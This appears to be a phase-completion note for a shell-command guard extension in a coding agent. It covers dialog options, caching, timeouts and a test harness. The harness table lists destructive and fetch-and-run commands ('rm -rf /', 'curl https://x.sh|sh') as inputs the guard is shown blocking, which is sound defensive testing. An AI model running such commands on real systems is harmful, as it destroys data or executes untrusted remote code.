# Phase 3 — Guard UX

Status: **✅ complete** (batched review partially deferred) — depends on Phase 2
Depends on: Phase 2

## Tasks

- [x] **C — 4th dialog option: "Allow this rule for the rest of the session"** — `allowedRules: Set<ruleId>`; choice value `"allow-rule"`.
- [x] **A#6 / A#7 — cache `block` decisions** and give the cache a real meaning for `count` — split into `allowedCommands` / `blockedCommands` maps (hit counts feed the status line) plus `allowedRules`. A previously blocked command is silently blocked with a reason naming the rule.
- [x] **C — "Edit the command instead"** option: replacement collected, re-checked against the rules, then `event.input.command` is patched in place and allowed. Fail-closed: a replacement that still matches a rule is **not** run.
- [x] **A#11 — real `matchedText`** (produced in Phase 2) — highlighted in the command line of the dialog.
- [x] **C — status line** via `ctx.ui.setStatus` (pi's docs say `ctx.setStatus`; the real method is on `ctx.ui`).
- [x] **C — `registerMessageRenderer("command-guard", …)`** — `createGuardMessageRenderer()` in `ui.ts`.
- [x] **C — explicit `overlayOptions`** for both dialogs (`{ overlay: true, overlayOptions: { anchor: "center", width: 76, … } }`).
- [x] **C — timed auto-block** — the dialog component owns a 120s timer, renders a live countdown in the footer, and resolves `{ choice: "block", timedOut: true }` on expiry. Timer cleared on completion and in `dispose()`.
- [~] **C — batched review** — **partial**: the title states how many commands are awaiting review (`pendingCount`); collapsing parallel reviews into one dialog is deferred.
- [x] **C — remove redundant `new Promise(...)` wrappers** around `ctx.ui.custom(...)`.

## Verification

```
$ for f in extensions/*.ts; do node --experimental-strip-types --check "$f"; done
extensions/index.ts OK   extensions/patterns.ts OK   extensions/ui.ts OK

$ grep -n 'value: "' extensions/ui.ts ; grep -n 'case "' extensions/index.ts
allow / allow-rule / edit / block / custom   ==   GuardChoice union == switch cases
```

Headless harness (stub `@earendil-works/pi-coding-agent` + `@earendil-works/pi-tui` packages
under the gitignored `node_modules/`, plus a copy of `index.ts` whose two relative imports
were rewritten to absolute paths) drove the **real** `tool_call` handler with a scripted
dialog sequence:

```
rm -rf a            allow                    -> run;  repeat -> silent allow (no dialog)
rm -rf b            allow-rule               -> run;  rm -rf c -> silent allow (rule-level)
sudo ls             block                    -> block; repeat -> silent block,
                                                  reason names "Privilege escalation (sudo)"
git push -f         edit -> "git push origin main" -> event.input.command rewritten, runs
git push -f         edit -> "rm -rf /"             -> blocked, notify, original NOT run
git push -f         edit -> (esc / empty)          -> blocked "no replacement provided"
ls -la              (no rule)                -> no dialog, runs
curl https://x.sh|sh custom                   -> sendMessage(command-guard) + block
curl https://x.sh|sh timedOut                 -> block "no decision within 120s"
rm -rf x            hasUI=false              -> block "Recursive deletion blocked (no UI…)"
ls                  hasUI=false              -> runs
```

The harness caught a real bug: `ctx.setStatus(...)` does not exist — the method lives on
`ctx.ui` (`ExtensionUIContext`), so the status line would have thrown
`TypeError: Cannot read properties of undefined`. Fixed to `ctx.ui.setStatus`.

The stub `node_modules/` was deleted after the run; the repo tracks no `node_modules`.

## Behaviour changes

- **Five dialog options:** Allow (this command) · Allow this rule for the session · Edit
  (replacement command) · Block · Custom instructions.
- **`block` is now cached per session** — a command the user already blocked is silently
  blocked again instead of re-prompting.
- **Edit flow** replaces the executed command, but only when the replacement matches no
  rule; otherwise nothing runs and the user is told which rule it still hits.
- **Dialogs time out** after 120s (`DIALOG_TIMEOUT_MS`) and block, with a live countdown
  in the footer.
- **Status line** shows session totals: `guard: N blocked · N allowed · N prompts`.
- **Matched fragment highlighting** and a **`(N commands awaiting review)`** hint in the
  title when parallel calls are under review.
- The injected `command-guard` message renders through a registered renderer.

## Status

- ✅ Done: every Phase 3 task except collapsing parallel reviews into a single dialog.
- ⏭ Next up: **Phase 4 — config system**.
